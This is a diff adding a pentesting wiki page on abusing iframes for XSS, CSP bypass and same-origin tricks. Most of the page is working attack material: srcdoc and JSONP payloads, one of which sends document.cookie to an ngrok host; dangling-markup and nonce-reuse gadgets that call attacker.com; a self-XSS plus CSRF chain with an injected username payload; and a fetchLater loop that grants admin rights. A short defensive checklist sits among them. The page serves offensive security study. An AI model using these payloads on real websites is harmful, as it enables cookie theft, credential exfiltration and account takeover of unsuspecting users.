@@ -1,0 +1,317 @@
+# Iframes in XSS, CSP and SOP
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## Iframes in XSS
+
+There are 3 ways to indicate the content of an iframed page:
+
+- Via `src` indicating an URL (the URL may be cross origin or same origin)
+- Via `src` indicating the content using the `data:` protocol
+- Via `srcdoc` indicating the content
+
+**Accessing parent and child variables**
+
+```html
+<html>
+  <script>
+    var secret = "31337s3cr37t"
+  </script>
+
+  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
+  <iframe id="if2" src="child.html"></iframe>
+  <iframe
+    id="if3"
+    srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
+  <iframe
+    id="if4"
+    src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
+
+  <script>
+    function access_children_vars() {
+      alert(if1.secret)
+      alert(if2.secret)
+      alert(if3.secret)
+      alert(if4.secret)
+    }
+    setTimeout(access_children_vars, 3000)
+  </script>
+</html>
+```
+
+```html
+<!-- content of child.html -->
+<script>
+  var secret = "child secret"
+  alert(parent.secret)
+</script>
+```
+
+If you access the previous html via a http server (like `python3 -m http.server`) you will notice that all the scripts will be executed (as there is no CSP preventing it)., **the parent won’t be able to access the `secret` var inside any iframe** and **only the iframes if2 & if3 (which are considered to be same-site) can access the secret** in the original window.\
+Note how if4 is considered to have `null` origin.
+
+### `srcdoc` quirks that matter in real exploits
+
+Two details around `srcdoc` are easy to miss during exploitation:<sup>[[8]](#references)</sup>
+
+- Unless the frame is sandboxed without `allow-same-origin`, a `srcdoc` document is **same-origin with the parent**. Therefore, injecting attacker-controlled HTML into `srcdoc` is usually equivalent to giving it direct DOM access to the top document.
+- Even though the document URL is `about:srcdoc`, **relative URLs are resolved using the embedding page URL as the base URL**. This means payloads such as `<script src="/upload/payload.js"></script>` or `<img src="/internal/debug">` will target the parent origin, not `about:srcdoc`.
+
+Practical payload:
+
+```html
+<iframe
+  srcdoc='<script src="/uploads/payload.js"></script><a href="#test">anchor</a>'></iframe>
+```
+
+This is specially useful when you only control markup but know a same-origin path that returns attacker-controlled JavaScript, JSONP, or HTML without a restrictive CSP.
+
+### Iframes with CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>
+
+> [!TIP]
+> Please, note how in the following bypasses the response to the iframed page doesn't contain any CSP header that prevents JS execution.
+
+The `self` value of `script-src` won’t allow the execution of the JS code using the `data:` protocol or the `srcdoc` attribute.\
+However, even the `none` value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the `src` attribute.\
+Therefore it’s possible to bypass the CSP of a page with:
+
+```html
+<html>
+  <head>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk'" />
+  </head>
+  <script>
+    var secret = "31337s3cr37t"
+  </script>
+  <iframe id="if1" src="child.html"></iframe>
+  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
+  <iframe
+    id="if3"
+    srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
+  <iframe
+    id="if4"
+    src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
+</html>
+```
+
+Note how the **previous CSP only permits the execution of the inline script**.\
+However, **only `if1` and `if2` scripts are going to be executed but only `if1` will be able to access the parent secret**.
+
+![srcdoc quirks that matter in real exploits - Iframes with CSP: However, only if1 and if2 scripts are going to be executed but only if1 will be able to access the parent secret](<../../images/image (372).png>)
+
+Therefore, it’s possible to **bypass a CSP if you can upload a JS file to the server and load it via iframe even with `script-src 'none'`**. This can **potentially be also done abusing a same-site JSONP endpoint**.
+
+You can test this with the following scenario were a cookie is stolen even with `script-src 'none'`. Just run the application and access it with your browser:
+
+```python
+import flask
+from flask import Flask
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
+    resp.headers['Content-Security-Policy'] = "script-src 'self'"
+    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
+    return resp
+
+@app.route("/cookie_s.html")
+def cookie_s():
+    return "<script>alert(document.cookie)</script>"
+
+if __name__ == "__main__":
+    app.run()
+```
+
+#### New (2023-2025) CSP bypass techniques with iframes
+
+The research community continues to discover creative ways of abusing iframes to defeat restrictive policies. Below you can find the most notable techniques published during the last few years:
+
+* **Dangling-markup / named-iframe data-exfiltration (PortSwigger 2023)** – When an application reflects HTML but a strong CSP blocks script execution, you can still leak sensitive tokens by injecting a *dangling* `<iframe name>` attribute. Once the partial markup is parsed, the attacker script running in a separate origin navigates the frame to `about:blank` and reads `window.name`, which now contains everything up to the next quote character (for example a CSRF token). Because no JavaScript runs in the victim context, the attack usually evades `script-src 'none'`.<sup>[[2]](#references)</sup> A minimal PoC is:
+
+  ```html
+  <!-- Injection point just before a sensitive <script> -->
+  <iframe name="//attacker.com/?">  <!-- attribute intentionally left open -->
+  ```
+  ```javascript
+  // attacker.com frame
+  const victim = window.frames[0];
+  victim.location = 'about:blank';
+  console.log(victim.name); // → leaked value
+  ```
+
+* **Nonce reuse via same-origin iframe** – CSP nonces are readable from the DOM by same-origin documents. If an attacker can inject or upload a *same-origin* HTML page and load it in an iframe, the child frame can read `top.document.querySelector('[nonce]').nonce` and mint new `<script nonce>` elements. This turns a same-origin HTML injection into full script execution even under `strict-dynamic` (because the nonce is already trusted). The following gadget escalates a markup injection into XSS:
+
+  ```javascript
+  const n = top.document.querySelector('[nonce]').nonce;
+  const s = top.document.createElement('script');
+  s.src = '//attacker.com/pwn.js';
+  s.nonce = n;
+  top.document.body.appendChild(s);
+  ```
+
+* **Form-action hijacking (PortSwigger 2024)** – A page that omits the `form-action` directive can have its login form *re-targeted* from an injected iframe or inline HTML so that password managers auto-fill and submit credentials to an external domain, even when `script-src 'none'` is present. Always complement `default-src` with `form-action`!<sup>[[1]](#references)</sup>
+
+**Defensive notes (quick checklist)**
+
+1. Always send *all* CSP directives that control secondary contexts (`form-action`, `frame-src`, `child-src`, `object-src`, etc.).
+2. Do not rely on nonces being secret—use `strict-dynamic` **and** eliminate injection points.
+3. When you must embed untrusted documents use `sandbox="allow-scripts allow-same-origin"` **very carefully** (or without `allow-same-origin` if you only need script execution isolation).
+4. Consider a defense-in-depth COOP+COEP deployment; the new `<iframe credentialless>` attribute (§ below) lets you do so without breaking third-party embeds.
+
+### Other Payloads found on the wild <a href="#other_payloads_found_on_the_wild_64" id="#other_payloads_found_on_the_wild_64"></a>
+
+```html
+<!-- This one requires the data: scheme to be allowed -->
+<iframe
+  srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
+<!-- This one injects JS in a jsonp endppoint -->
+<iframe srcdoc='
+<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
+<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
+<iframe
+  src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
+```
+
+### Iframe sandbox
+
+The content within an iframe can be subjected to additional restrictions through the use of the `sandbox` attribute. By default, this attribute is not applied, meaning no restrictions are in place.
+
+When utilized, the `sandbox` attribute imposes several limitations:<sup>[[7]](#references)</sup>
+
+- The content is treated as if it originates from a unique source.
+- Any attempt to submit forms is blocked.
+- Execution of scripts is prohibited.
+- Access to certain APIs is disabled.
+- It prevents links from interacting with other browsing contexts.
+- Use of plugins via `<embed>`, `<object>`, `<applet>`, or similar tags is disallowed.
+- Navigation of the content's top-level browsing context by the content itself is prevented.
+- Features that are triggered automatically, like video playback or auto-focusing of form controls, are blocked.
+
+Tip: Modern browsers support granular flags such as `allow-scripts`, `allow-same-origin`, `allow-top-navigation-by-user-activation`, `allow-downloads-without-user-activation`, etc. Combine them to grant only the minimum capabilities required by the embedded application.
+
+The attribute's value can be left empty (`sandbox=""`) to apply all the aforementioned restrictions. Alternatively, it can be set to a space-separated list of specific values that exempt the iframe from certain restrictions.
+
+```html
+<!-- Isolated but can run JS (cannot reach parent because same-origin is NOT allowed) -->
+<iframe sandbox="allow-scripts" src="demo_iframe_sandbox.htm"></iframe>
+```
+
+If the embedded page is **same-origin** and you grant both `allow-scripts` and `allow-same-origin`, the sandbox becomes a very weak boundary. The child can execute JavaScript, access `top.document`, and even remove the `sandbox` attribute from its own `<iframe>` element:
+
+```javascript
+const me = top.document.querySelector("iframe")
+me.removeAttribute("sandbox")
+top.location = "/admin"
+```
+
+In practice, `sandbox="allow-scripts allow-same-origin"` should be treated as **unsafe for attacker-influenced same-origin content**. It is still useful for some third-party embeds, but it is not an isolation boundary against hostile same-origin HTML.
+
+### Credentialless iframes
+
+As explained in [this article](https://blog.slonser.info/posts/make-self-xss-great-again/), the `credentialless` flag in an iframe is used to load a page inside an iframe without sending credentials in the request while maintaining the same origin policy (SOP) of the loaded page in the iframe.<sup>[[4]](#references)</sup>
+
+Since **Chrome 110 (February 2023) the feature is enabled by default** and the spec is being standardized across browsers under the name *anonymous iframe*. MDN describes it as: “a mechanism to load third-party iframes in a brand-new, ephemeral storage partition so that no cookies, localStorage or IndexedDB are shared with the real origin”.<sup>[[3]](#references)[[5]](#references)</sup> Consequences for attackers and defenders:
+
+* Scripts in different credentialless iframes **still share the same top-level origin** and can freely interact via the DOM, making multi-iframe self-XSS attacks feasible (see PoC below).
+* Because the network is **credential-stripped**, any request inside the iframe effectively behaves as an unauthenticated session – CSRF protected endpoints usually fail, but public pages leakable via DOM are still in scope.
+* Storage is **partitioned by a top-level document nonce**: credentialless frames on the same page can share storage with each other, but it is cleared when the top-level document is discarded.
+* Pop-ups spawned from a credentialless iframe get an implicit `rel="noopener"`, breaking some OAuth flows.
+* Browsers are expected to **disable autofill/password managers** inside credentialless iframes, limiting credential theft via autofill in these contexts.
+
+```javascript
+// PoC: two same-origin credentialless iframes stealing cookies set by a third
+window.top[1].document.cookie = 'foo=bar';            // write
+alert(window.top[2].document.cookie);                 // read -> foo=bar
+```
+
+- Exploit example: Self-XSS + CSRF
+
+In this attack, the attacker prepares a malicious webpage with 2 iframes:
+
+- An iframe loads the victim's page with the `credentialless` flag and a CSRF that triggers XSS (for example, self-XSS in the user's username):
+  ```html
+  <html>
+  <body>
+    <form action="http://victim.domain/login" method="POST">
+      <input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
+      <input type="hidden" name="password" value="Super_s@fe_password" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+  </html>
+  ```
+
+- Another iframe that actually has the user logged in (without the `credentialless` flag).
+
+Then, from the XSS it's possible to access the other iframe as they have the same SOP and steal the cookie for example executing:
+
+```javascript
+alert(window.top[1].document.cookie);
+```
+
+### fetchLater Attack
+
+As indicated in [this article](https://blog.slonser.info/posts/make-self-xss-great-again/) the API `fetchLater` allows configuring a request to be executed later. This can be abused to, for example, login a victim inside an attacker's session (with Self-XSS), schedule a `fetchLater` request (to change the password of the current user for example), and logout from the attacker's session. Then, when the victim logs into their own session, the deferred request can execute using the cookies available at dispatch time, changing the password of the victim to the one set by the attacker.<sup>[[4]](#references)</sup>
+
+Operational notes:<sup>[[6]](#references)</sup>
+
+- `fetchLater` entered Chrome origin trial in 2024 and shipped in Chrome 135 (April 2025), so feature-detect before relying on it.
+- The response is **not** available to JavaScript; body/headers are ignored once the deferred request is sent.
+- CSP enforcement uses `connect-src` (not `script-src`) for deferred requests.
+- Requests fire on page unload or when `activateAfter` expires (whichever happens first).
+- The maximum single delay is currently `299000` ms, so long waits require re-scheduling several deferred requests.
+
+This way even if the victim URL cannot be loaded in an iframe (due to CSP or other restrictions), the attacker can still execute a request in the victim's session.
+
+
+```javascript
+var req = new Request("/change_rights",{method:"POST",body:JSON.stringify({username:"victim", rights: "admin"}),credentials:"include"})
+for (let i = 1; i <= 20; i++)
+  fetchLater(req,{activateAfter: i * 299000})
+```
+
+
+## Iframes in SOP
+
+Check the following pages:
+
+
+{{#ref}}
+../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md
+{{#endref}}
+
+
+{{#ref}}
+../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md
+{{#endref}}
+
+
+{{#ref}}
+../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md
+{{#endref}}
+
+
+{{#ref}}
+../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md
+{{#endref}}
+
+
+
+## References
+
+- [1] [PortSwigger Research – Using form hijacking to bypass CSP (March 2024)](https://portswigger.net/research/using-form-hijacking-to-bypass-csp)
+- [2] [PortSwigger Research – Bypassing CSP with dangling iframes (Jun 2022)](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)
+- [3] [Chrome Developers – Iframe credentialless: Easily embed iframes in COEP environments (Feb 2023)](https://developer.chrome.com/blog/iframe-credentialless)
+- [4] [Slonser – Make Self-XSS Great Again](https://blog.slonser.info/posts/make-self-xss-great-again/)
+- [5] [MDN – IFrame credentialless](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/IFrame_credentialless)
+- [6] [MDN – Window.fetchLater()](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetchLater)
+- [7] [MDN – `<iframe>` element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
+- [8] [MDN – `HTMLIFrameElement.srcdoc`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/srcdoc)
+
+{{#include ../../banners/hacktricks-training.md}}
